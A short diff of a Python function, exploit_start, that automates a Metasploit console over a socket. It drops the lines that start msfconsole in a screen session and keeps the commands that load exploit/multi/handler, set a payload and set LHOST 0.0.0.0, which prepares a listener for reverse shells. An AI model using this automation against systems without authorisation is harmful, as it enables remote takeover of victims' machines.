@@ -32,8 +32,6 @@ def exploit_start(ip: str, port:int, client_ip: str, payload: str):
             return True
         elif "Port" in answer:
             port = answer.split(":")[1].strip()
-    conversation(socket, Data("Screen", "metasploit_" + ip + "_" + str(uuid.uuid4())), "OK")
-    conversation(socket, Data("Command", "msfconsole"), "OK")
     conversation(socket, Data("Command", "use exploit/multi/handler"), "OK")
     conversation(socket, Data("Command", "set PAYLOAD " + payload), "OK")
     conversation(socket, Data("Command", "set LHOST 0.0.0.0"), "OK")
